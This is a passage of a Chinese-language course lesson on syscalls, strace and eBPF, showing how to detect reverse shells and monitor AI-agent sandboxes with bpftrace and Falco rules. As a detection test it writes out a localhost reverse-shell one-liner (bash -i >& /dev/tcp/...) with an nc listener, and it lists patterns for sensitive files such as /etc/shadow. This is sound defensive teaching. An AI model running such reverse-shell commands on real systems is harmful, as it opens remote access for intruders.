+<p>本质是<strong>「起一个 shell + 把它的输入输出重定向到一个网络连接」</strong>。从 syscall 视角看，必然出现的组合是：</p>
+
+<ol>
+  <li><code>socket()</code> + <code>connect()</code>：建立到外部的 TCP 连接</li>
+  <li><code>dup2()</code> 三次：把 stdin/stdout/stderr 重定向到 socket fd</li>
+  <li><code>execve("/bin/sh")</code> 或 <code>execve("/bin/bash")</code>：起 shell</li>
+</ol>
+
+<p><span class="key">这个组合在正常程序里几乎不出现</span>——所以是非常可靠的检测特征。</p>
+
+<h3>8.2 用 bpftrace 写一个简易检测器</h3>
+
+<pre><code>// reverse_shell_detector.bt
+// 思路：一个进程在短时间内同时做了 connect 和 execve(/bin/*sh)，告警
+
+BEGIN { printf("Monitoring for reverse shell pattern...\n"); }
+
+// 1. 记录最近 connect 的进程（PID -&gt; 时间戳）
+tracepoint:syscalls:sys_enter_connect
+{
+    @last_connect[pid] = nsecs;
+}
+
+// 2. 当 execve 发生时，如果是 shell 且最近刚 connect 过，告警
+tracepoint:syscalls:sys_enter_execve
+/ (str(args-&gt;filename) == "/bin/sh" ||
+   str(args-&gt;filename) == "/bin/bash") &amp;&amp;
+  @last_connect[pid] != 0 &amp;&amp;
+  (nsecs - @last_connect[pid]) &lt; 1000000000 /  // 1 秒内
+{
+    printf("[ALERT] reverse-shell pattern: pid=%d comm=%s exe=%s ppid=%d\n",
+        pid, comm, str(args-&gt;filename),
+        curtask-&gt;real_parent-&gt;tgid);
+}
+
+END { clear(@last_connect); }</code></pre>
+
+<p>跑起来：</p>
+
+<pre><code>sudo bpftrace reverse_shell_detector.bt
+# 在另一个终端模拟反弹 shell（在自己机器上！）
+# 先启动监听：nc -lvnp 4444
+# 然后：bash -c 'bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1'
+# bpftrace 会立即告警</code></pre>
+
+<h3>8.3 真实产品里的检测要更细</h3>
+
+<p>上面的脚本是<strong>原理演示</strong>，生产规则要考虑：</p>
+
+<ul>
+  <li><strong>误报过滤</strong>：systemd、SSH server、容器 runtime 的某些场景会"合法"地出现 connect + exec 模式，需要白名单。</li>
+  <li><strong>父进程链</strong>：如果触发者的父进程是 sshd → bash → ...，相对正常；如果父进程链是 nginx → python → bash，几乎一定是 webshell。</li>
+  <li><strong>容器维度</strong>：如果是 K8s，需要带上 namespace + pod 名 + container ID（eBPF 能从 cgroup 信息里取出）。</li>
+  <li><strong>命令行参数</strong>：bash 后跟 <code>-i</code>（interactive）+ 网络字符是强信号；裸 bash 是噪音。</li>
+  <li><strong>网络目的地</strong>：连接到内网 IP 还是公网？目标端口是 4444 / 1337 / 9999 这类常见 C2 端口吗？</li>
+</ul>
+
+<p>Falco 内置的 "Reverse shell" 规则差不多就是把上面这些组合写成 YAML，监控规则一开开就生效。下面是 Falco 规则的真实样子（精简后）：</p>
+
+<pre><code>- rule: Reverse Shell Activity
+  desc: Detect reverse shell created via exec
+  condition: &gt;
+    spawned_process and
+    proc.name in (shell_binaries) and
+    proc.tty != 0 and
+    (proc.cmdline contains "/dev/tcp/" or
+     proc.cmdline contains "bash -i" or
+     proc.args contains "-e /bin/")
+  output: &gt;
+    Reverse shell detected (user=%user.name container=%container.id
+    command=%proc.cmdline parent=%proc.pname)
+  priority: WARNING
+  tags: [network, mitre_lateral_movement]</code></pre>
+
+<div class="connect" id="connect">
+<h2>🔗 与 AI / Agent 安全的连结</h2>
+
+<p><strong>1. Agent 沙箱必须有 syscall 维度的运行时监控</strong>。无论你的沙箱是 Docker 容器、micro VM（Firecracker / gVisor）还是 chroot——<strong>仅做"启动时配置"是不够的</strong>，因为 LLM 生成的代码千变万化，再加上 indirect prompt injection、用户上传的 RAG 文档藏了恶意指令等场景，配置漏洞难免。<span class="key">真正可靠的最后一道防线是 eBPF 在运行时盯每一个 syscall</span>：execve 启动了什么？connect 连了哪个 IP？openat 碰了哪个敏感路径？这些信息可以送进规则引擎实时告警，也可以送进 AI 二次判定。</p>
+
+<p><strong>2. eBPF 是「容器逃逸 / 主机入侵」检测的标准答案</strong>。Week 9 我们会讲到容器逃逸的几条经典路径——它们最终都体现为一些"不寻常的 syscall 组合"（比如挂载 host /proc、调 unshare 创建新 namespace、cgroup release_agent 写文件）。<span class="key">Falco / Tetragon 监控的就是这些 syscall 特征</span>。今天你理解了 bpftrace 的 one-liner 怎么写，Week 12 周六我们再回来看 Falco/Tetragon 时就是熟门熟路了。</p>
+
+<p><strong>3. 检测 LLM 生成代码的"实际意图"</strong>。光看 LLM 输出文本判断它是好是坏越来越不可靠——攻击者用 base64 编码、用拼接字符串、用 LLM 自身的"翻译"绕过文本检测。但<strong>不管 LLM 生成什么样的 Python 代码，它跑起来一定要发 syscall</strong>——如果发了 <code>connect() + execve(bash)</code>，意图清晰；如果发了 <code>openat("/etc/shadow")</code>，意图清晰。这是 Agent 沙箱<span class="key">用 eBPF 监控"代码实际行为"而不是"代码文本"</span>的核心价值。</p>
+
+<p><strong>4. eBPF 也能挂用户态：监控 Python 解释器内部</strong>。eBPF 的 <code>uprobe</code> 能挂到任何用户态二进制的函数。对 CPython 来说，可以挂到 <code>_PyEval_EvalFrameDefault</code>、<code>PyImport_ImportModule</code> 等关键函数，做"哪个 Python 模块被 import 了"这种粒度的检测——比 syscall 维度更精细。<strong>Pixie、Pyroscope 这些云原生 profiling 工具就这么干</strong>。未来 Agent 安全产品很可能会出现"针对 LLM 解释器的 eBPF 探针套件"。</p>
+
+<p><strong>5. 写自己的 eBPF Falco 规则之前，先理解攻击模式</strong>。Day 06 我们讲了 6 大本地提权路径，今天讲了反弹 shell 检测。这两者是 Agent 沙箱被攻破后"第一步动作"的两大类——前者是"提权拿更多权限"，后者是"建立持久通信通道"。一个合格的 Agent 安全工程师应当能把这两类攻击翻译成 5-10 条 eBPF 规则，并知道每条规则的误报来源。Week 23 周六 LLM 攻击面综述时我们会把这套规则集补全。</p>
+</div>
+
+<h2 id="exercise">📝 今日小练习</h2>
+
+<div class="exercise">
+<p><span class="exercise-num">1</span><strong>30 分钟 · strace 三个套路全跑一遍</strong></p>
+<p>启动一个 Ubuntu 容器，里面装上 strace + Python，然后：</p>
+<pre><code>docker run -it --rm --cap-add SYS_PTRACE ubuntu:22.04 bash
+apt update &amp;&amp; apt install -y strace python3
+
+# 套路 A：找文件错误
+strace -e openat python3 -c "open('/nonexistent')" 2&gt;&amp;1 | grep -i "no such"
+
+# 套路 B：性能统计
+strace -c python3 -c "print('hi')" 2&gt;&amp;1 | tail -20
+# 看 % time 最高的是哪个 syscall——通常是 mmap，因为加载 libpython
+
+# 套路 C：分析未知行为
+strace -f -e trace=file,network python3 -c "
+import urllib.request
+urllib.request.urlopen('http://example.com')
+" 2&gt;&amp;1 | head -30
+# 你能看到 DNS 解析、TCP connect、TLS 握手对应的所有 syscall</code></pre>
+<p>问题：<strong>统计 print('hi') 总共触发了多少次 syscall？</strong>对比你 Day 01 学到的"用户态 vs 内核态"概念思考——为什么一个简单的 print 要发这么多次。</p>
+</div>
+
+<div class="exercise">
+<p><span class="exercise-num">2</span><strong>45 分钟 · 用 bpftrace 写两个监控脚本</strong></p>
+<p>在一台 Linux VM 或 privileged Docker 里装 bpftrace：</p>
+<pre><code># Ubuntu
+sudo apt install -y bpftrace
+
+# 或 Docker 里
+docker run -it --rm --privileged --pid=host --net=host \
+  -v /sys:/sys -v /lib/modules:/lib/modules:ro \
+  ubuntu:22.04 bash
+apt update &amp;&amp; apt install -y bpftrace</code></pre>
+<p><strong>脚本 A：监控所有 execve</strong> —— 类似 execsnoop 的简易版：</p>
+<pre><code>sudo bpftrace -e '
+tracepoint:syscalls:sys_enter_execve
+{ printf("%-8d %-16s %s\n", pid, comm, str(args-&gt;filename)); }
+'</code></pre>
+<p><strong>脚本 B：监控对 /etc 下敏感文件的访问</strong>：</p>
+<pre><code>sudo bpftrace -e '
+tracepoint:syscalls:sys_enter_openat
+/ str(args-&gt;filename) == "/etc/passwd" ||
+  str(args-&gt;filename) == "/etc/shadow" ||
+  str(args-&gt;filename) == "/etc/sudoers" /
+{ printf("[%H:%M:%S] %s(%d) opens %s\n",
+    comm, pid, str(args-&gt;filename)); }
+'</code></pre>
+<p>另开终端跑 <code>cat /etc/passwd</code>、<code>sudo cat /etc/shadow</code> 验证脚本能抓到。<strong>思考</strong>：脚本 B 有什么误报来源？（提示：SSH 登录、cron job 都会读 /etc/passwd）</p>
+</div>
+
+<div class="exercise">
+<p><span class="exercise-num">3</span><strong>15 分钟 · 思考题（Agent 安全设计）</strong></p>
+<p>你设计一个 Agent code interpreter 沙箱，用 Docker + non-root + cap_drop ALL 已经做了静态隔离。现在老板要求"<strong>给我加一层运行时检测，万一沙箱被攻破能在 10 秒内告警</strong>"。基于今天学的：</p>
+<ol type="A">
+  <li>你会在哪一层装监控？为什么不是应用层 / 库层，而是 syscall 层？</li>
+  <li>列出 5 个你认为"沙箱里出现就应该立即告警"的 syscall 模式（参考今天讲的反弹 shell、提权、敏感文件访问、容器逃逸前兆等）。</li>
+  <li>用什么技术栈？bpftrace 写脚本 vs 部署 Falco 现成规则 vs 自己写 BCC 程序 vs Tetragon，每个的优劣？</li>
+  <li>监控数据怎么和 Agent 本身的对话历史 / tool call 记录关联？（这是 LLM 时代独有的问题——传统主机安全没有"是哪个用户对话触发了这个进程"的概念）</li>
+</ol>
+<p>用 5 分钟在纸上画一张架构图，标出"事件源 → 内核 eBPF 探针 → 用户态 agent → 规则引擎 → 关联 LLM 会话 → 告警"。这就是你以后真的会在公司画的图。</p>
+</div>
+
+<div class="next">
+<strong>明日预告 · Day 14 · 周日 🌐 · 文件系统 + 零拷贝 + Week 02 周复盘</strong>。Week 02 最后一天，4 小时综合。覆盖：VFS 层 / inode + dentry / ext4 vs xfs vs btrfs 选型 / 磁盘 IO 完整路径（应用 → page cache → block layer → IO scheduler → 驱动 → 物理设备）/ zero-copy（sendfile、splice、io_uring 的零拷贝模式）/ fsync 和 O_DIRECT 的取舍 / page cache 的友与敌。重点是"大模型 checkpoint 加载怎么加速 5-10 倍"——这是 vLLM、SGLang 真实使用的优化技术。最后是 Week 02 整体复盘 + Week 03 网络周预告。
+</div>
+
+</body>
+</html>
